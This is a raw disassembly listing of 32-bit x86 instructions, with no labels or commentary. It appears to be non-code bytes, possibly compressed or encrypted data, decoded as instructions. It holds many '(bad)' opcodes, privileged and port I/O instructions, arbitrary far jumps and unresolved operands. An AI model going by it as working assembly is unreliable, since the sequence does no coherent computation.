  41654e:	mov    esp,0x92d04d87
  416553:	sub    DWORD PTR [ebp+0x7b],ecx
  416556:	mov    fs,WORD PTR [edx+edx*8+0x3a]
  41655a:	mov    dh,0x22
  41655c:	dec    edx
  41655d:	int    0xda
  41655f:	xchg   ebx,eax
  416560:	outs   dx,DWORD PTR ds:[esi]
  416561:	fwait
  416562:	mov    bh,0xa3
  416564:	xor    DWORD PTR [ebx-0x4c02b4a0],eax
  41656a:	push   es
  41656b:	imul   BYTE PTR [eax+0x19137d72]
  416571:	bound  edi,QWORD PTR [edx-0x6ebb3ee8]
  416577:	jge    0x4165f3
  416579:	sahf   
  41657a:	aad    0x3d
  41657c:	cwde   
  41657d:	dec    ebx
  41657e:	std    
  41657f:	daa    
  416580:	xor    eax,0x3084b84e
  416585:	ret    0x3819
  416588:	pop    edi
  416589:	data16 sub ch,BYTE PTR [edx+edi*8]
  41658d:	cmovbe ebx,DWORD PTR [esi+0x315efa18]
  416594:	ds sub eax,0xa27a2898
  41659a:	mov    ebx,0xdd1090bf
  41659f:	rcl    DWORD PTR [edx+0x6a],1
  4165a2:	test   BYTE PTR ss:[eax],cl
  4165a5:	cmp    DWORD PTR [ebx-0x72fc4073],esi
  4165ab:	pop    ebx
  4165ac:	mov    bl,0xfb
  4165ae:	les    eax,FWORD PTR [eax+eiz*2-0x266b9af0]
  4165b5:	mov    esi,0x61e507fb
  4165ba:	es retf 
  4165bc:	mov    eax,0x11fc013
  4165c1:	sub    al,0xed
  4165c3:	push   cs
  4165c4:	dec    esp
  4165c5:	xchg   ecx,eax
  4165c6:	add    cl,dl
  4165c8:	rcl    BYTE PTR [esi-0x5],1
  4165cb:	xchg   edx,eax
  4165cc:	in     eax,dx
  4165cd:	es out dx,eax
  4165cf:	pop    edi
  4165d0:	push   ss
  4165d1:	gs or  ebp,esp
  4165d4:	or     eax,0xa20d2932
  4165d9:	or     esi,DWORD PTR [ebp-0x61695d04]
  4165df:	inc    ebx
  4165e0:	inc    esp
  4165e1:	sti    
  4165e2:	loope  0x416632
  4165e4:	iret   
  4165e5:	sahf   
  4165e6:	loop   0x416656
  4165e8:	and    al,0x91
  4165ea:	pop    ss
  4165eb:	sbb    al,0x26
  4165ed:	inc    eax
  4165ee:	mov    cl,0xdc
  4165f0:	fwait
  4165f1:	data16 sbb dl,0x4b
  4165f5:	sub    BYTE PTR [ecx],ah
  4165f7:	xchg   ecx,eax
  4165f8:	imul   edi,DWORD PTR [ecx],0xe7d015a9
  4165fe:	push   ss
  4165ff:	lahf   
  416600:	jmp    0xa412:0xe033587b
  416607:	and    BYTE PTR [esi+0x47],bh
  41660a:	xchg   esp,eax
  41660b:	imul   esi,esp,0x70fda6b4
  416611:	test   al,0x2d
  416613:	dec    eax
  416614:	and    al,0xe2
  416616:	fist   WORD PTR [edi-0x5b]
  416619:	jle    0x416603
  41661b:	lods   eax,DWORD PTR ds:[esi]
  41661c:	inc    ebp
  41661d:	outs   dx,DWORD PTR ds:[esi]
  41661e:	punpckhbw mm6,QWORD PTR [ebp+0x1a]
  416622:	push   ss
  416623:	repz sbb dl,BYTE PTR [esi-0x2827ad6]
  41662a:	push   edx
  41662b:	rcr    DWORD PTR [esp+ecx*4],0xf6
  41662f:	jg     0x416674
  416631:	fwait
  416632:	push   ebp
  416633:	xchg   edi,eax
  416634:	and    eax,DWORD PTR [edi]
  416636:	(bad)  
  416637:	jae    0x4165c4
  416639:	test   eax,0xd4a3cd50
  41663e:	ds xchg ebx,eax
  416640:	stos   BYTE PTR es:[edi],al
  416641:	ja     0x41667e
  416643:	push   cs
  416644:	or     al,0xa4
  416646:	xchg   edi,eax
  416647:	std    
  416648:	inc    edx
  416649:	mov    ah,0x43
  41664b:	retf   
  41664c:	pop    esi
  41664d:	in     al,0x0
  41664f:	dec    BYTE PTR [ebp-0x2b793ef1]
  416655:	cmp    BYTE PTR [ecx],dh
  416657:	cs inc edx
  416659:	jnp    0x4166a7
  41665b:	add    edx,esp
  41665d:	les    ebx,FWORD PTR [esi-0x9]
  416660:	in     eax,0x7
  416662:	ds lock and al,0x83
  416666:	pop    eax
  416667:	ficom  DWORD PTR ds:0x35e86e6b
  41666d:	mov    eax,ds:0xd654d384
  416672:	mov    ebx,0xba02584f
  416677:	dec    ecx
  416678:	lock push 0xb4e12c9c
  41667e:	ret    0xa254
  416681:	cmp    dl,BYTE PTR [edi]
  416683:	ss dec esi
  416685:	pop    esp
  416686:	pop    esp
  416687:	cmp    BYTE PTR [edi],bl
  416689:	dec    esp
  41668a:	or     bh,bl
  41668c:	add    BYTE PTR [ebx-0x80],al
  41668f:	fild   WORD PTR [esi+esi*4-0x43]
  416693:	mov    ds,WORD PTR [eax]
  416695:	mov    eax,0x6667e54b
  41669a:	sub    ch,ah
  41669c:	les    ecx,FWORD PTR [ebp+0x9]
  41669f:	dec    ebx
  4166a0:	pop    ebp
  4166a1:	hlt    
  4166a2:	inc    ecx
  4166a3:	pushf  
  4166a4:	loopne 0x4166b6
  4166a6:	jbe    0x4166ec
  4166a8:	jo     0x416671
  4166aa:	(bad)  [eiz*8+0x28caecb]
  4166b1:	or     esp,ecx
  4166b3:	xor    DWORD PTR [ebp+edi*2+0x62],0x4ca90ece
  4166bb:	add    al,0x7f
  4166bd:	pop    esp
  4166be:	(bad)  
  4166bf:	in     eax,0x78
  4166c1:	fst    DWORD PTR [edi-0x6d]
  4166c4:	mov    edi,0xf086c771
  4166c9:	xchg   BYTE PTR [ecx+0x751b80fb],cl
  4166cf:	push   es
  4166d0:	out    dx,eax
  4166d1:	out    0x4d,al
  4166d3:	jp     0x416672
  4166d5:	stc    
  4166d6:	(bad)  
  4166d7:	sahf   
  4166d8:	das    
  4166d9:	stos   BYTE PTR es:[edi],al
  4166da:	push   esi
  4166db:	push   es
  4166dc:	cmp    bl,bh
  4166de:	jmp    0x4166dd
  4166e0:	aad    0xad
  4166e2:	cwde   
  4166e3:	(bad)  
  4166e4:	out    0xec,eax
  4166e6:	or     DWORD PTR [edx-0x177ea6d1],esp
  4166ec:	mov    fs,WORD PTR ds:0x84f4c628
  4166f2:	test   eax,0x40c51489
  4166f7:	adc    al,0x7e
  4166f9:	jbe    0x4166b4
  4166fb:	loope  0x4166f5
  4166fd:	jnp    0x416751
  4166ff:	in     al,dx
  416700:	adc    al,0xd0
  416702:	dec    edx
  416703:	cmp    ebx,DWORD PTR [esi-0x56ef1f03]
  416709:	lods   al,BYTE PTR ds:[esi]
  41670a:	pop    ss
  41670b:	pop    ecx
  41670c:	jo     0x416738
  41670e:	cmp    edi,esi
  416710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416711:	push   cs
  416712:	add    BYTE PTR ds:0xcd0efdea,0xe1
  416719:	mov    ?,ebp
  41671b:	ja     0x4166eb
  41671d:	mov    al,ds:0xaa52b172
  416722:	mov    dl,0x2c
  416724:	dec    ecx
  416725:	jno    0x4166c2
  416727:	mov    ecx,0xa7fd2046
  41672c:	or     esi,DWORD PTR [ecx]
  41672e:	out    dx,al
  41672f:	gs pop ss
  416731:	dec    edx
  416732:	sub    DWORD PTR [ebx-0x1e],0xffffffbf
  416736:	lods   al,BYTE PTR ds:[esi]
  416737:	aas    
  416738:	lds    edx,FWORD PTR [eax+edi*4+0x2a]
  41673c:	pop    edi
  41673d:	push   ebx
  41673e:	aas    
  41673f:	jmp    0x4167a2
  416741:	jns    0x4167a6
  416743:	aaa    
  416744:	call   0xdf93:0x307aecd4
  41674b:	add    eax,0xf0efc9eb
  416750:	sbb    bl,BYTE PTR [ebx-0x71]
  416753:	pop    edx
  416754:	dec    eax
  416755:	and    al,cl
  416757:	xor    ch,BYTE PTR [ecx+0x444d3ea6]
  41675d:	inc    esi
  41675e:	jecxz  0x41673e
  416760:	enter  0x94f0,0x71
  416764:	xor    al,0x76
  416766:	iret   
  416767:	sub    al,BYTE PTR [ecx+0x5303141e]
  41676d:	xchg   ecx,ebx
  41676f:	(bad)  
  416770:	jno    0x4167f1
  416772:	xchg   edi,eax
  416773:	call   0x3e335d67
  416778:	jns    0x4167a3
  41677a:	and    al,0x55
  41677c:	rcl    BYTE PTR [esi+ebp*8],0x1a
  416780:	sbb    DWORD PTR [ecx-0xe218983],eax
  416786:	test   bl,0x30
  416789:	xchg   edi,eax
  41678a:	sahf   
  41678b:	and    BYTE PTR [ecx-0x5b7e6ba0],al
  416791:	sbb    eax,0x2ad0f8ee
  416796:	cmp    eax,edi
  416798:	daa    
  416799:	sub    bh,BYTE PTR [esp+ecx*8+0x52]
  41679d:	xchg   esp,eax
  41679e:	clc    
  41679f:	scas   al,BYTE PTR es:[edi]
  4167a0:	stos   BYTE PTR es:[edi],al
  4167a1:	xchg   edx,eax
  4167a2:	cmp    ch,BYTE PTR [ecx]
  4167a4:	mov    ecx,0x74e958f1
  4167a9:	jg     0x416782
  4167ab:	lock rcr DWORD PTR [ebp+0x15],cl
  4167af:	retf   
  4167b0:	mov    ebp,0x8a6fa632
  4167b5:	push   ss
  4167b6:	popa   
  4167b7:	in     eax,0xab
  4167b9:	mov    al,0x7b
  4167bb:	in     eax,0x44
  4167bd:	ret    0x1423
  4167c0:	fist   WORD PTR ds:0x34e84a50
  4167c6:	xor    cl,BYTE PTR [edi-0x66]
  4167c9:	mov    ebx,0x1f539c00
  4167ce:	sbb    eax,0xf47ec380
  4167d3:	or     eax,DWORD PTR [edi-0x41]
  4167d6:	loopne 0x416774
  4167d8:	inc    ecx
  4167d9:	push   0xffffff8c
  4167db:	cwde   
  4167dc:	stc    
  4167dd:	std    
  4167de:	pop    ecx
  4167df:	call   0x1000:0xb1bfdd4
  4167e6:	lock sub BYTE PTR [ebx-0x7396a8d3],dh
  4167ed:	inc    ecx
  4167ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ef:	loope  0x416846
  4167f1:	mov    ebx,0x3f1f0a91
  4167f6:	rcl    BYTE PTR [esi],cl
  4167f8:	aaa    
  4167f9:	(bad)
  4167fd:	mov    WORD PTR [ecx+0x71],cs
  416800:	or     DWORD PTR [eax+0x22a0e736],esi
  416806:	in     al,0x3c
  416808:	inc    esi
  416809:	pop    edi
  41680a:	ja     0x4167b9
  41680c:	mov    edx,0x5541abf9
  416811:	or     BYTE PTR [esi],dh
  416813:	pop    es
  416814:	fcomp  DWORD PTR [ebp-0x1e]
  416817:	fs fsubrp st(0),st
  41681a:	inc    ebx
  41681b:	arpl   WORD PTR [edx+0x39],bp
  41681e:	(bad)  
  416820:	pop    edx
  416821:	int3   
  416822:	imul   esp,DWORD PTR [edi+0x6bd5e70b],0x84377252
  41682c:	(bad)  
  41682d:	adc    ebp,DWORD PTR [esi+0x7c73cdb7]
  416833:	sub    dh,BYTE PTR [edi+0x3]
  416836:	jge    0x4167f6
  416838:	pushf  
  416839:	xor    BYTE PTR [ecx-0x74e28f67],bl
  41683f:	and    bh,BYTE PTR [ebx]
  416841:	mov    edi,0x6e4b370f
  416846:	and    al,0xdc
  416848:	out    0xde,eax
  41684a:	f2xm1  
  41684c:	xchg   esp,eax
  41684d:	push   0x555c2a46
  416852:	scas   eax,DWORD PTR es:[edi]
  416853:	mov    ds:0x32f962b7,eax
  416858:	imul   esi,DWORD PTR [eax+0x47b576ae],0xffffffb8
  41685f:	and    eax,0x5c3cef07
  416864:	retf   
  416865:	test   BYTE PTR ds:0xd922ff2d,0x4c
  41686c:	jecxz  0x416890
  41686e:	push   0xac0bd759
  416873:	fstp   TBYTE PTR [esi-0x4ec730e9]
  416879:	cmp    ebx,edx
  41687b:	(bad)  
  41687c:	adc    ah,BYTE PTR [ebp-0x3c789dca]
  416882:	mov    ecx,0x643d8b6d
  416887:	sbb    eax,0x577ce925
  41688c:	push   es
  41688d:	out    0xb8,al
  41688f:	gs jl  0x41682a
  416892:	push   edi
  416893:	fbld   TBYTE PTR [ebp+edx*1+0x1950804b]
  41689a:	dec    edi
  41689b:	mov    cl,0x81
  41689e:	xchg   dh,dl
  4168a0:	cmp    esp,DWORD PTR [eax-0x51]
  4168a3:	int3   
  4168a4:	aaa    
  4168a5:	push   ebx
  4168a6:	ficom  WORD PTR [eax-0x48ac648d]
  4168ac:	sub    edi,ebp
  4168ae:	sbb    eax,DWORD PTR ds:0x55994ad5
  4168b4:	in     eax,0x14
  4168b6:	out    dx,al
  4168b7:	cmp    al,0x48
  4168b9:	xchg   esp,eax
  4168ba:	cmc    
  4168bb:	jns    0x41692e
  4168bd:	push   ecx
  4168be:	int3   
  4168bf:	dec    ecx
  4168c0:	pushf  
  4168c1:	cmc    
  4168c2:	mov    bl,0x2a
  4168c4:	push   ds
  4168c5:	jle    0x41688a
  4168c7:	sbb    esp,DWORD PTR [ebx+ebx*8-0x7ba96e4a]
  4168ce:	stos   DWORD PTR es:[edi],eax
  4168cf:	jg     0x4168ac
  4168d1:	inc    ecx
  4168d2:	fnstsw WORD PTR [ecx-0x3a]
  4168d5:	cmp    cl,BYTE PTR [esi]
  4168d7:	mov    esi,0xf7615542
  4168dc:	sahf   
  4168dd:	push   esi
  4168de:	xchg   ebp,eax
  4168df:	dec    edx
  4168e0:	push   ss
  4168e1:	push   esi
  4168e2:	sbb    dl,BYTE PTR [ecx]
  4168e4:	ds xchg bh,ah
  4168e7:	jbe    0x4168c4
  4168e9:	in     al,0xee
  4168eb:	out    dx,al
  4168ec:	aam    0xb3
  4168ee:	sub    bh,ch
  4168f0:	gs dec esi
  4168f2:	scas   eax,DWORD PTR es:[edi]
  4168f3:	outs   dx,DWORD PTR ds:[esi]
  4168f4:	push   0x6a0bebb7
  4168f9:	imul   eax,DWORD PTR [ebx+0x5c6f63bc],0x27
  416900:	ja     0x416888
  416902:	out    dx,eax
  416903:	bound  ebp,QWORD PTR [ebx-0x29]
  416906:	lods   eax,DWORD PTR ds:[esi]
  416907:	fyl2xp1 
  416909:	and    ecx,edx
  41690b:	xchg   esp,eax
  41690c:	ins    DWORD PTR es:[edi],dx
  41690d:	sbb    BYTE PTR [ebx],0x27
  416910:	xchg   ebp,eax
  416911:	in     al,0xf9
  416913:	mov    BYTE PTR [eax],bh
  416915:	sbb    BYTE PTR [edx+0x36],bl
  416918:	xchg   esi,eax
  416919:	cwde   
  41691a:	mov    gs,WORD PTR [ebx+0xc57016d]
  416920:	mov    edi,esp
  416922:	add    esp,ecx
  416924:	sbb    BYTE PTR [edi-0x4d],ah
  416927:	inc    ebx
  416928:	mov    dl,0xb3
  41692a:	scas   al,BYTE PTR es:[edi]
  41692b:	push   0x86aa53ce
  416930:	add    al,0xd0
  416932:	mov    ebp,0x2dba4c59
  416937:	inc    esi
  416938:	stc    
  416939:	sub    al,0xfa
  41693b:	bound  ebp,QWORD PTR [eax]
  41693d:	repnz xor bh,BYTE PTR [edx-0x7b29da6b]
  416944:	xchg   esp,eax
  416945:	sbb    bh,BYTE PTR [esi+0x79040fde]
  41694b:	xor    ch,BYTE PTR [ebp-0x5dbd0d0d]
  416951:	test   al,0xe9
  416953:	pop    esp
  416954:	bnd jmp 0x416902
  416957:	(bad)  
  416958:	add    al,0xac
  41695a:	dec    ecx
  41695b:	sbb    BYTE PTR [esi+eiz*2],ah
  41695e:	lahf   
  41695f:	outs   dx,DWORD PTR ds:[esi]
  416960:	mov    dl,0x76
  416962:	mov    ch,0xa6
  416964:	ja     0x4168f8
  416966:	daa    
  416967:	push   ds
  416968:	cmp    eax,0xdc5ddbac
  41696d:	cmp    esi,ebx
  41696f:	dec    esp
  416970:	das    
  416971:	in     al,0x6
  416973:	lods   al,BYTE PTR ds:[esi]
  416974:	outs   dx,DWORD PTR ds:[esi]
  416975:	call   0xbd63:0xfcccc36b
  41697c:	xchg   ebp,eax
  41697e:	lods   eax,DWORD PTR ds:[esi]
  41697f:	fisttp WORD PTR [ebx+0x51aef77c]
  416985:	mov    al,0xe4
  416987:	xchg   ecx,eax
  416988:	imul   esi,DWORD PTR [ebp+0x7e],0xe76a57b
  41698f:	je     0x41692d
  416991:	cmp    esi,DWORD PTR [eax]
  416993:	(bad)  
  416994:	sbb    eax,0xab7c6d8b
  416999:	ror    DWORD PTR [eax],cl
  41699b:	jbe    0x4169f2
  41699d:	lds    ecx,FWORD PTR [ecx]
  41699f:	dec    ecx
  4169a0:	xor    eax,0xda50816b
  4169a5:	pop    ecx
  4169a6:	push   es
  4169a7:	jbe    0x4169fa
  4169a9:	pop    edi
  4169aa:	js     0x416a0e
  4169ac:	push   ds
  4169ad:	(bad)  
  4169ae:	jle    0x416967
  4169b0:	repz adc eax,DWORD PTR [eax-0x5c]
  4169b4:	push   ebp
  4169b5:	cmp    eax,0x3e9b2ee7
  4169ba:	add    dl,ch
  4169bc:	add    eax,0x429d3823
  4169c1:	aaa    
  4169c2:	xchg   ebx,eax
  4169c3:	push   es
  4169c4:	sbb    al,ah
  4169c6:	xchg   ebx,eax
  4169c7:	adc    ah,ch
  4169c9:	rcr    BYTE PTR [ebx],cl
  4169cb:	popf   
  4169cc:	jecxz  0x416975
  4169ce:	and    esp,edx
  4169d0:	mov    edx,ecx
  4169d2:	test   BYTE PTR gs:[esi+edx*1+0x3061fb0e],ch
  4169da:	call   0x1a7:0x7605b835
  4169e1:	sti    
  4169e2:	jae    0x41699f
  4169e4:	xchg   ebp,eax
  4169e5:	es push esi
  4169e7:	xchg   esi,esp
  4169e9:	add    al,0x4
  4169eb:	adc    al,0xb0
  4169ed:	xlat   BYTE PTR ds:[ebx]
  4169ee:	jmp    0xe542:0xdd952188
  4169f5:	mov    bl,0x20
  4169f7:	icebp  
  4169f8:	dec    edx
  4169f9:	in     eax,0x9a
  4169fb:	xor    eax,0xf3b32e8f
  416a00:	and    DWORD PTR [ebp+0x64dd3ed9],ebp
  416a06:	mov    bl,cl
  416a08:	xchg   ebp,eax
  416a09:	fld    st(4)
  416a0b:	(bad)  
  416a0c:	dec    ebx
  416a0d:	or     BYTE PTR [edi],0xbc
  416a10:	loopne 0x416a07
  416a12:	sbb    dl,BYTE PTR [edx]
  416a14:	in     al,0x9f
  416a16:	push   cs
  416a17:	or     al,0xd1
  416a19:	mov    eax,0xa8ebc9a4
  416a1e:	hlt    
  416a1f:	push   es
  416a20:	shl    BYTE PTR [ebp+0x4375d108],cl
  416a26:	mov    ecx,esi
  416a28:	stc    
  416a29:	or     BYTE PTR [edx],0xee
  416a2c:	fmul   QWORD PTR [ecx]
  416a2e:	xchg   ebp,eax
  416a2f:	retf   
  416a30:	jmp    0x249b:0xbd393147
  416a37:	dec    ebx
  416a38:	mov    cl,0x3e
  416a3a:	add    al,0xf4
  416a3c:	xchg   BYTE PTR [eax-0x5e5f1c56],ah
  416a42:	cmp    dl,BYTE PTR [edx+0x2c]
  416a45:	xchg   esp,eax
  416a46:	and    bh,bl
  416a48:	xchg   esi,eax
  416a49:	enter  0x9a23,0x40
  416a4d:	pop    ss
  416a4e:	jns    0x416a62
  416a50:	mov    al,0xa5
  416a52:	inc    ebp
  416a53:	out    0xd8,al
  416a55:	(bad)
  416a58:	fdivr  DWORD PTR [ecx-0x1d400058]
  416a5e:	add    DWORD PTR [ebx-0x1de6e57],ebp
  416a64:	fnstsw WORD PTR [ebx+eax*2]
  416a67:	in     eax,dx
  416a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a69:	and    eax,edx
  416a6b:	rcl    dh,0xf4
  416a6e:	xor    BYTE PTR [esi-0x5e],bh
  416a71:	bound  esi,QWORD PTR [eiz*2-0x59f30805]
  416a78:	cli    
  416a79:	push   ebp
  416a7a:	scas   eax,DWORD PTR es:[edi]
  416a7b:	mov    eax,ds:0xf8718dc7
  416a80:	mov    dh,0xc2
  416a82:	inc    ecx
  416a83:	es int3 
  416a85:	mov    ds:0x694ea5eb,eax
  416a8a:	(bad)  
  416a8b:	stos   BYTE PTR es:[edi],al
  416a8c:	sbb    al,0xa9
  416a8e:	inc    edi
  416a8f:	xor    bl,BYTE PTR [edx+0x376a5d90]
  416a95:	scas   eax,DWORD PTR es:[edi]
  416a96:	mov    esi,0xf1ebd878
  416a9b:	and    al,0x73
  416a9d:	enter  0x7566,0x6f
  416aa1:	mov    ds:0x8bf61cef,al
  416aa6:	fisubr DWORD PTR [edi-0x1556a6f]
  416aac:	arpl   WORD PTR [edi-0x247e1922],di
  416ab2:	outs   dx,DWORD PTR ds:[esi]
  416ab3:	test   al,0x92
  416ab5:	mov    dl,0x5c
  416ab7:	sub    BYTE PTR [ecx+0x50d7ebe0],cl
  416abd:	jmp    0x2a3c:0xffbe5e57
  416ac4:	mov    esi,?
  416ac6:	in     eax,0x3c
  416ac8:	dec    edx
  416ac9:	cmp    ebx,ebp
  416acb:	push   eax
  416acc:	push   cs
  416acd:	or     al,0xe1
  416acf:	rcr    DWORD PTR [eax+0x2a727b2c],1
  416ad5:	jmp    0x54287fc4
  416ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416adb:	inc    edi
  416adc:	or     al,0xa1
  416ade:	jnp    0x416abe
  416ae0:	cmp    DWORD PTR [edi],eax
  416ae2:	jle    0x416a77
  416ae4:	or     eax,0x2aea06f9
  416ae9:	ret    
  416aea:	(bad)  
  416aeb:	push   ebp
  416aec:	repz cdq 
  416aee:	push   es
  416aef:	mov    bh,0xe2
  416af1:	inc    edx
  416af2:	push   edx
  416af3:	dec    ebp
  416af4:	sub    bh,BYTE PTR [edi+0x64]
  416af7:	mov    WORD PTR [ebx-0x6b],?
  416afa:	ins    BYTE PTR es:[edi],dx
  416afb:	xchg   esi,eax
  416afc:	iret   
  416afd:	sub    ebx,DWORD PTR [ebx-0x40]
  416b00:	jb     0x416ac3
  416b02:	shr    cl,1
  416b04:	and    dl,al
  416b06:	repnz mov ecx,DWORD PTR [edx-0x7f]
  416b0a:	gs pushf 
  416b0c:	jl     0x416b60
  416b0e:	cmp    al,0x85
  416b10:	xchg   edx,eax
  416b11:	push   esp
  416b12:	mov    esi,0x42639bb9
  416b17:	loopne 0x416b58
  416b19:	mov    ecx,0xbb8ddc6b
  416b1e:	ficomp WORD PTR [ebx]
  416b20:	gs jae 0x416b8d
  416b23:	lds    eax,FWORD PTR [edx-0xab402fd]
  416b29:	int    0xed
  416b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b2c:	ficom  DWORD PTR ds:0x861b299e
  416b32:	sub    DWORD PTR [ecx+eiz*8-0x6b2fd3de],edx
  416b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b3a:	les    edi,FWORD PTR [ebx]
  416b3c:	rol    BYTE PTR [ecx],cl
  416b3e:	mov    eax,ds:0x22db0b41
  416b43:	and    eax,0xc02b4273
  416b48:	test   BYTE PTR [ebp+ebp*4+0x6790bb09],0x3f
  416b50:	fsubr  st(6),st
  416b52:	vmwrite ebx,DWORD PTR [edi]
  416b55:	dec    ecx
  416b56:	mov    al,0xd6
  416b58:	call   0xdc148e45
  416b5d:	pop    ds
  416b5e:	ja     0x416b8d
  416b60:	and    eax,DWORD PTR [edi-0x6d68f7f]
  416b66:	jae    0x416bd1
  416b68:	clc    
  416b69:	jb     0x416b9c
  416b6b:	mov    ch,0x9
  416b6d:	retf   0x348d
  416b70:	stos   BYTE PTR es:[edi],al
  416b71:	fs in  eax,0x1f
  416b74:	add    eax,0x9f63d1e2
  416b79:	(bad)  
  416b7a:	mov    ch,0xa7
  416b7c:	test   al,0x57
  416b7e:	jmp    0x416b0f
  416b80:	fidivr DWORD PTR [edi+0x5b]
  416b83:	cmc    
  416b84:	(bad)  
  416b86:	ja     0x416bfb
  416b88:	imul   BYTE PTR [edx+0x1263caea]
  416b8e:	pop    ebx
  416b8f:	hlt    
  416b90:	in     al,0x88
  416b92:	push   cs
  416b93:	jns    0x416b82
  416b95:	repz push ss
  416b97:	dec    eax
  416b98:	xchg   edx,eax
  416b99:	push   0x15553b24
  416b9e:	pop    esp
  416b9f:	cmp    BYTE PTR [edi-0x1a12797e],dh
  416ba5:	les    esp,FWORD PTR [ebp-0x2e]
  416ba8:	cmp    bl,BYTE PTR ds:0x5add1008
  416bae:	xchg   ecx,eax
  416baf:	add    BYTE PTR [ebx-0x3a42f41c],ch
  416bb5:	xchg   edi,eax
  416bb6:	sub    BYTE PTR [esi+0x531dea86],dl
  416bbc:	dec    esi
  416bbd:	push   esi
  416bbe:	add    eax,0x301577fa
  416bc3:	pop    ss
  416bc4:	adc    ah,bh
  416bc6:	mov    BYTE PTR [ebx],bl
  416bc8:	inc    ecx
  416bc9:	in     al,dx
  416bca:	push   cs
  416bcb:	sahf   
  416bcc:	pop    edi
  416bcd:	(bad)  
  416bce:	test   DWORD PTR [esi+0x77],0x28d7507b
  416bd5:	into   
  416bd6:	push   ebx
  416bd7:	mov    dh,0xed
  416bd9:	hlt    
  416bda:	rol    BYTE PTR [edi],1
  416bdc:	into   
  416bdd:	popf   
  416bde:	cdq    
  416bdf:	jnp    0x416ba7
  416be1:	(bad)  
  416be2:	xchg   esi,eax
  416be3:	outs   dx,DWORD PTR ds:[esi]
  416be4:	cmp    DWORD PTR [eax+0x3d],edx
  416be7:	retfw  
  416be9:	inc    BYTE PTR [ecx]
  416beb:	je     0x416c0b
  416bed:	mov    ebp,0x6b4f9d79
  416bf2:	jp     0x416b9a
  416bf4:	loope  0x416c32
  416bf6:	push   edx
  416bf7:	cli    
  416bf8:	mov    bl,0xa6
  416bfa:	(bad)  
  416bfb:	push   ebx
  416bfc:	jmp    0x416bdb
  416bfe:	int    0x87
  416c00:	jmp    0x3ca5cba7
  416c05:	aaa    
  416c06:	push   0x3e
  416c08:	fadd   st,st(0)
  416c0a:	fidiv  WORD PTR [ecx+esi*8-0x6]
  416c0e:	mov    ebp,0x7db056b5
  416c13:	pushf  
  416c14:	ja     0x416c17
  416c16:	es js  0x416bfe
  416c19:	clc    
  416c1a:	cdq    
  416c1b:	inc    ebp
  416c1c:	lods   eax,DWORD PTR ds:[esi]
  416c1d:	cdq    
  416c1e:	jbe    0x416c35
  416c20:	call   0x3e78:0x9dab25b6
  416c27:	aaa    
  416c28:	lock sub BYTE PTR [ecx],bh
  416c2b:	icebp  
  416c2c:	sub    al,dh
  416c2e:	fidivr DWORD PTR [ebx-0x67]
  416c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c32:	aad    0xf2
  416c34:	cmp    esi,ebp
  416c36:	aaa    
  416c37:	xor    ah,ah
  416c39:	push   0xf9deca54
  416c3e:	xchg   BYTE PTR [eax],ch
  416c40:	cs dec eax
  416c42:	jne    0x416c1e
  416c44:	pop    edx
  416c45:	add    ebp,esi
  416c47:	or     cl,bl
  416c49:	cmp    al,0xf5
  416c4b:	pusha  
  416c4c:	pop    eax
  416c4d:	dec    esp
  416c4e:	sub    al,0xe4
  416c50:	test   al,0x3c
  416c52:	or     eax,0x632728fd
  416c57:	push   es
  416c58:	or     ecx,esp
  416c5a:	popa   
  416c5b:	push   edi
  416c5c:	fiadd  WORD PTR [ecx]
  416c5e:	add    dh,BYTE PTR [eax]
  416c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c61:	mov    WORD PTR [eax+0x46],es
  416c64:	sar    BYTE PTR [edx+0x33c05d58],0xfa
  416c6b:	sub    BYTE PTR [ecx+esi*8],al
  416c6e:	fwait
  416c6f:	and    cl,BYTE PTR [edi]
  416c71:	sar    BYTE PTR [ebx-0x22a20d66],cl
  416c77:	loopne 0x416bfa
  416c79:	jmp    0x16df2dcd
  416c7e:	cmp    BYTE PTR [eax+0x77],dl
  416c81:	fiadd  WORD PTR [eax+0x52]
  416c84:	or     DWORD PTR [ebx+0x4f],ecx
  416c87:	stos   DWORD PTR es:[edi],eax
  416c88:	mov    esp,0x9851f0b0
  416c8d:	in     eax,0xca
  416c8f:	out    0x2,al
  416c91:	inc    ecx
  416c92:	mov    edx,0x705b1737
  416c97:	outs   dx,BYTE PTR ds:[esi]
  416c98:	jmp    0x1606:0xcae8d691
  416c9f:	and    BYTE PTR [eax-0x2bb5482d],0x23
  416ca6:	mov    bh,0xd5
  416ca8:	push   0xfffffffd
  416caa:	xchg   ebp,eax
  416cab:	adc    al,ch
  416cad:	ja     0x416c4b
  416caf:	clc    
  416cb0:	or     dl,BYTE PTR [edx-0x59]
  416cb3:	mov    ebp,DWORD PTR [edi]
  416cb5:	pop    ds
  416cb6:	lods   al,BYTE PTR ds:[esi]
  416cb7:	pop    ss
  416cb8:	dec    esi
  416cb9:	xlat   BYTE PTR ds:[ebx]
  416cba:	adc    al,0x2
  416cbc:	setns  dl
  416cbf:	push   ebp
  416cc0:	jb     0x416caf
  416cc2:	lea    ecx,[esi-0x299d84d4]
  416cc8:	pushf  
  416cc9:	test   DWORD PTR [eax+0x51],0xc9f3fccb
  416cd0:	daa    
  416cd1:	inc    DWORD PTR [edi-0x620bbb5e]
  416cd7:	mov    cl,0x5
  416cd9:	stos   BYTE PTR es:[edi],al
  416cda:	mov    ds:0x2ebf34ba,eax
  416cdf:	ja     0x416ca0
  416ce1:	movups XMMWORD PTR [eax],xmm1
  416ce4:	xor    al,0x3e
  416ce6:	mov    ebx,DWORD PTR [eax+0x1858aa33]
  416cec:	in     al,0x4
  416cee:	jae    0x416c9d
  416cf0:	enter  0x8a25,0xdb
  416cf4:	(bad)  
  416cf5:	or     edi,DWORD PTR [esi]
  416cf7:	aam    0x33
  416cf9:	xchg   DWORD PTR [edx+eax*2+0x4c3ca0fd],esp
  416d00:	mov    dh,0x3c
  416d02:	lsl    eax,WORD PTR [ecx]
  416d05:	into   
  416d06:	fild   WORD PTR [eax-0x186f72e4]
  416d0c:	push   esp
  416d0d:	mov    ebx,0xfb1bb098
  416d12:	(bad)  
  416d13:	sbb    DWORD PTR [edx],edi
  416d15:	adc    al,0x70
  416d17:	std    
